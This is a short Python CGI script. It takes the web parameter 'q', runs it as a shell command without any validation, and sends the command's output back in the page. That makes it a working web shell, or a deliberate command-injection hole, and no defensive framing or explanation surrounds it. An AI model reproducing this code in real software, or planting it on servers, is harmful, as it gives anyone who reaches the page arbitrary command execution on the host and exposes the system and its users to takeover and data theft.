#!/usr/bin/python3
import cgi
import subprocess
print("content-type: text/html")
print()


y=cgi.FieldStorage()
o=y.getvalue("q")

y=cgi.FieldStorage()
output=subprocess.getoutput(o)
print(output)
